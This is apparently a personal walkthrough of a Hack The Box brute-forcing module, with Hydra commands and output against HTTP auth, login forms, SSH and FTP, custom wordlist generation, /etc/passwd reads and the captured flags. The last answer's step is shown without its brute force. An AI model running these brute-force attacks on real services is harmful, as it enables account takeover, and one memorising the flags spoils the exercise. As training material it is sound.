@@ -1,0 +1,365 @@
+[Default Passwords] + [Username Brute Force]
+
+[*] Target: 206.189.120.154:30206
+
+[Question 1] Using the technique you learned in this section, try attacking the IP shown above. What are the credentials used?
+
+    # locate ftp-betterdefaultpasslist.txt
+
+        /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+        /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt
+        /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+
+    # hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f 206.189.120.154 -s 30206  http-get /
+
+        [?] "-C" option in Hydra is used to specify the path to a file containing a list of username and password combinations to be used during the brute-force attack
+
+        [?] "-s 30206": This option specifies the service to target. In this case, the number "30206" represents the port number of the service you want to attack.
+
+        [?] "http-get": This specifies the method to be used for the attack
+
+        [?] "/": The forward slash ("/") represents the resource or endpoint path that Hydra will target during the attack. 
+                 In this case, the single forward slash denotes the root path or the default page of the website.
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-01 03:33:01
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
+        [DATA] attacking http-get://206.189.120.154:30206/
+        [30206][http-get] host: 206.189.120.154   login: admin   password: admin
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-01 03:33:02
+
+    [!] Answer: "admin:admin"
+
+
+[Login Form Attacks]
+
+[*] Target: 206.189.120.154:30206
+
+[Question 1] Using what you learned in this section, try attacking the '/login.php' page to identify the password for the 'admin' user. 
+             Once you login, you should find a flag. Submit the flag as the answer.
+
+    => http://206.189.120.154:30206/login.php
+
+        ...
+        <body>
+                <form name='login' autocomplete='off' class='form' action='' method='post'>
+            <div class='control'>
+                <h1>
+                Admin Panel
+                </h1>
+            </div>
+        ...
+
+        POST /login.php HTTP/1.1
+        Host: 206.189.120.154:30206
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 19
+        Origin: http://206.189.120.154:30206
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Connection: close
+        Referer: http://206.189.120.154:30206/login.php
+        Cookie: PHPSESSID=b7hv00sl4ke95siv1ifv04m1qe
+        Upgrade-Insecure-Requests: 1
+
+        username=admin&password=password
+
+    # hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 206.189.120.154 
+      -s 30206 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-01 03:58:53
+        [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) 
+                  from a previous session found, to prevent overwriting, ./hydra.restore
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+        [DATA] attacking http-post-form://206.189.120.154:30206/login.php:username=^USER^&password=^PASS^:F=<form name='login'
+        [30206][http-post-form] host: 206.189.120.154   login: admin   password: password1
+        [STATUS] attack finished for 206.189.120.154 (valid pair found)
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-01 03:59:28
+
+    => HTB{bru73_f0rc1n6_15_4_l457_r350r7}
+
+    [!] Answer: "HTB{bru73_f0rc1n6_15_4_l457_r350r7}"
+
+
+[Service Authentication Brute Forcing]
+
+[Target: 161.35.42.190:31304]
+
+[Question 1]  Using what you learned in this section, try to brute force the SSH login of the user "b.gates" in the target server shown above.
+              Then try to SSH into the server. You should find a flag in the home dir. What is the content of the flag?
+
+    [Note] You can see the wordlist I uploaded for this question named "CBBH - william.txt"
+
+    # hydra -l b.gates -P william.txt -f ssh://161.35.42.190:31304     
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-01 05:21:20
+        [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 13093 login tries (l:1/p:13093), ~819 tries per task
+        [DATA] attacking ssh://161.35.42.190:31304/
+        [31304][ssh] host: 161.35.42.190   login: b.gates   password: 4dn1l3M!$
+        [STATUS] attack finished for 161.35.42.190 (valid pair found)
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-01 05:21:2
+
+    #  ssh b.gates@161.35.42.190 -p 31304
+
+        >> b.gates@ng-788964-bruteforcing-2-bf6dn-568fbfb8b4-7nrkw:~$ ls
+            flag.txt  rockyou-10.txt
+        
+        >> b.gates@ng-788964-bruteforcing-2-bf6dn-568fbfb8b4-7nrkw:~$ cat flag.txt
+            HTB{n3v3r_u53_c0mm0n_p455w0rd5!}
+
+    [!] Answer: "HTB{n3v3r_u53_c0mm0n_p455w0rd5!}"
+
+[Question 2] Once you ssh in, try brute forcing the FTP login for the other user. You should find another flag in their home directory. What is the flag?
+
+    [Step 1] Find the 'other users'
+
+        >> b.gates@ng-788964-bruteforcing-2-bf6dn-568fbfb8b4-7nrkw:~$ cat /etc/passwd
+            root:x:0:0:root:/root:/bin/bash
+            ...
+            b.gates:x:1000:1000::/home/b.gates:/bin/bash
+            m.gates:x:1001:1001::/home/m.gates:/bin/bash
+
+        => I think our target is m.gates
+
+    [Step 2] Brute force the ftp service
+
+        >> b.gates@bruteforcing:~$ netstat -antp | grep -i list
+
+            (No info could be read for "-p": geteuid()=1000 but you should be root.)
+            tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
+            tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+            tcp6       0      0 :::80                   :::*                    LISTEN      -    
+
+        => ftp service is already opened! Good
+
+        >> b.gates@ng-788964-bruteforcing-2-bf6dn-568fbfb8b4-7nrkw:/home/m.gates$ hydra -l m.gates -P /home/b.gates/rockyou-10.txt ftp://127.0.0.1
+
+            Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-01 10:38:13
+            [DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
+            [DATA] attacking ftp://127.0.0.1:21/
+            [21][ftp] host: 127.0.0.1   login: m.gates   password: computer
+            1 of 1 target successfully completed, 1 valid password found
+            Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-01 10:38:33
+            
+        >> b.gates@ng-788964-bruteforcing-2-bf6dn-568fbfb8b4-7nrkw:~$ ftp 127.0.0.1
+            
+            ...
+            200 PORT command successful. Consider using PASV.
+            150 Here comes the directory listing.
+            -rw-------    1 1001     1001           33 Sep 11  2020 flag.txt
+            226 Directory send OK.
+            ftp> get flag.txt
+
+        >> b.gates@ng-788964-bruteforcing-2-bf6dn-568fbfb8b4-7nrkw:~$ ls
+            flag.txt  rockyou-10.txt
+            
+        >> b.gates@ng-788964-bruteforcing-2-bf6dn-568fbfb8b4-7nrkw:~$ cat flag.txt
+            HTB{1_4m_@_bru73_f0rc1n6_m4573r}
+
+    [!] Answer: "HTB{1_4m_@_bru73_f0rc1n6_m4573r}"
+
+
+[Skills Assessment] - Website
+
+[*] Target: 167.99.192.213:30864
+
+[Question 1] When you try to access the IP shown above, you will not have authorization to access it. Brute force the authentication and retrieve the flag.
+
+    # hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f 167.99.192.213 -s 30864 http-get /
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-01 07:12:07
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
+        [DATA] attacking http-get://167.99.192.213:30864/
+        [30864][http-get] host: 167.99.192.213   login: user   password: password
+        [STATUS] attack finished for 167.99.192.213 (valid pair found)
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-01 07:12:08
+
+        => HTB{4lw4y5_ch4n63_d3f4ul7_p455w0rd5}
+
+    [!] Answer: "HTB{4lw4y5_ch4n63_d3f4ul7_p455w0rd5}"
+
+[Question 2] Once you access the login page, you are tasked to brute force your way into this page as well. What is the flag hidden inside?
+
+    [*] Hint: Use the username you found in the previous question 
+
+    - Go to http://167.99.192.213:30864/admin_login.php
+
+    POST /admin_login.php HTTP/1.1
+    Host: 167.99.192.213:30864
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: en-US,en;q=0.5
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 28
+    Origin: http://167.99.192.213:30864
+    Authorization: Basic dXNlcjpwYXNzd29yZA==
+    Connection: close
+    Referer: http://167.99.192.213:30864/admin_login.php
+    Cookie: PHPSESSID=8i4p62d7c8h28m1p8j046jp7qu
+    Upgrade-Insecure-Requests: 1
+
+    user=user&pass=hungthinhtran
+
+    ...
+    <body>
+            <form name='log-in' autocomplete='off' class='form' action='' method='post'>
+        <div class='control'>
+            <h1>
+            Admin Panel
+            </h1>
+        </div>
+    ...
+
+    # hydra -l user -P /usr/share/eaphammer/wordlists/rockyou.txt -f 167.99.192.213 -s 30864 
+      http-post-form "/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'"
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-01 07:31:31
+        [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) 
+                  from a previous session found, to prevent overwriting, ./hydra.restore
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+        [DATA] attacking http-post-form://167.99.192.213:30864/admin_login.php:user=^USER^&pass=^PASS^:F=<form name='log-in'
+        [30864][http-post-form] host: 167.99.192.213   login: user   password: harrypotter
+        [STATUS] attack finished for 167.99.192.213 (valid pair found)
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-01 07:32:05
+
+    => HTB{c0mm0n_p455w0rd5_w1ll_4lw4y5_b3_h4ck3d!}
+
+    [!] Answer: "HTB{c0mm0n_p455w0rd5_w1ll_4lw4y5_b3_h4ck3d!}"
+
+
+[Skills Assessment] - Service Login
+
+[*] Target: 206.189.120.154:31241
+
+[*] SSH to 206.189.120.154 with user "" and password ""
+
+[Question 1]  As you now have the name of an employee from the previous skills assessment question, 
+              try to gather basic information about them, and generate a custom password wordlist that meets the password policy.
+              Also use 'usernameGenerator' to generate potential usernames for the employee. 
+              Finally, try to brute force the SSH server shown above to get the flag.
+
+    [*] Hint: A name of an employee can be found inside the admin panel of the previous skills assessment exercise. 
+              To reduce the length of the wordlist, don't input too much information about the victim. 
+              Start with only their first name, and if you don't get a hit, then start adding information gradually to build bigger wordlists.
+
+
+    - In the previous question, after login as Harry Potter, we saw this:
+
+        Welcome back Mr. Harry Potter!
+        Please change your password, as it is very weak!
+        You password must meet the company's Password Policy:
+        Must be 8 characters or longer
+        Must contain numbers
+        Must contain special characters
+
+    => With the hint they gave, I can create a super basic password wordlist
+
+        #cupp -i
+            ___________ 
+            cupp.py!                 # Common
+               \                     # User
+                \   ,__,             # Passwords
+                  \ (oo)____         # Profiler
+                    (__)    )\   
+                       ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
+                                        [ Mebus | https://github.com/Mebus/]
+
+
+            [+] Insert the information about the victim to make a dictionary
+            [+] If you don't know all the info, just hit enter when asked! ;)
+
+            > First Name: Harry
+            > Surname: 
+            > Nickname: 
+            > Birthdate (DDMMYYYY): 
+            ...
+            > Do you want to add some key words about the victim? Y/[N]: N
+            > Do you want to add special chars at the end of words? Y/[N]: Y
+            > Do you want to add some random numbers at the end of words? Y/[N]:N
+            > Leet mode? (i.e. leet = 1337) Y/[N]: Y
+
+            [+] Now making a dictionary...
+            [+] Sorting list and removing duplicates...
+            [+] Saving dictionary to harry.txt, counting 3696 words.
+            [+] Now load your pistolero with harry.txt and shoot! Good luck!
+                                                                                                                
+        # sed -ri '/^.{,7}$/d' harry.txt   
+                
+                [?] Remove Passwords Shorter Than 8                                                                                             
+
+        # sed -ri '/[!-/:-@\[-`\{-~]+/!d' harry.txt  
+
+                [?] Remove Passwords With No Special Chars
+                                                                                                                
+        # sed -ri '/[0-9]+/!d' harry.txt   
+                                            
+                [?] Remove Passwords With No Numbers
+
+    - In this module, they teach us how to use the username-anarchy right
+
+        # ./username-anarchy Harry Potter > username.txt
+
+    # hydra -L username.txt -P harry.txt -u -f ssh://167.99.192.213:30714 -t 4
+
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-06-01 08:47:18
+        [WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) 
+                  from a previous session found, to prevent overwriting, ./hydra.restore
+        [DATA] max 4 tasks per 1 server, overall 4 tasks, 21780 login tries (l:15/p:1452), ~5445 tries per task
+        [DATA] attacking ssh://167.99.192.213:30714/
+        [30714][ssh] host: 167.99.192.213   login: harry.potter   password: H4rry!!!
+        [STATUS] attack finished for 167.99.192.213 (valid pair found)
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-06-01 08:47:32
+
+    # ssh harry.potter@167.99.192.213 -p 30714
+
+        >> harry.potter@ng-788964-bruteforcingasmt-2-s4bfr-65b44f87b4-4mx9v:~$ ls
+            flag.txt  rockyou-30.txt
+
+        >> harry.potter@ng-788964-bruteforcingasmt-2-s4bfr-65b44f87b4-4mx9v:~$ cat flag.txt
+            HTB{4lw4y5_u53_r4nd0m_p455w0rd_63n3r470r}
+
+    [!] Answer: "HTB{4lw4y5_u53_r4nd0m_p455w0rd_63n3r470r}"
+                                                                                                     
+[Question 2]  Once you are in, you should find that another user exists in server. Try to brute force their login, and get their flag.
+
+    >> harry.potter@ng-788964-bruteforcingasmt-2-s4bfr-65b44f87b4-4mx9v:~$ netstat -antp | grep -i list
+        (No info could be read for "-p": geteuid()=1000 but you should be root.)
+        tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+        tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+        tcp6       0      0 :::80                   :::*                    LISTEN      -   
+
+    >> harry.potter@ng-788964-bruteforcingasmt-2-s4bfr-65b44f87b4-4mx9v:~$ ls
+        flag.txt  rockyou-30.txt
+
+    >> harry.potter@ng-788964-bruteforcingasmt-2-s4bfr-65b44f87b4-4mx9v:~$ cat /etc/passwd
+        root:x:0:0:root:/root:/bin/bash
+        ...
+        harry.potter:x:1000:1000::/home/harry.potter:/bin/bash
+        g.potter:x:1001:1001::/home/g.potter:/bin/bash
+        ftp:x:107:109:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+
+    >> harry.potter@ng-788964-bruteforcingasmt-2-s4bfr-65b44f87b4-4mx9v:~$ ftp 127.0.0.1
+
+        ftp> ls
+        200 PORT command successful. Consider using PASV.
+        150 Here comes the directory listing.
+        -rw-------    1 1001     1001           55 Sep 11  2020 flag.txt
+        226 Directory send OK.
+        ftp> get flag.txt
+
+    >> harry.potter@ng-788964-bruteforcingasmt-2-s4bfr-65b44f87b4-4mx9v:~$ cat flag.txt
+        HTB{1_50l3mnly_5w34r_7h47_1_w1ll_u53_r4nd0m_p455w0rd5}
+
+    [!] Answer: "HTB{1_50l3mnly_5w34r_7h47_1_w1ll_u53_r4nd0m_p455w0rd5}"
+
+
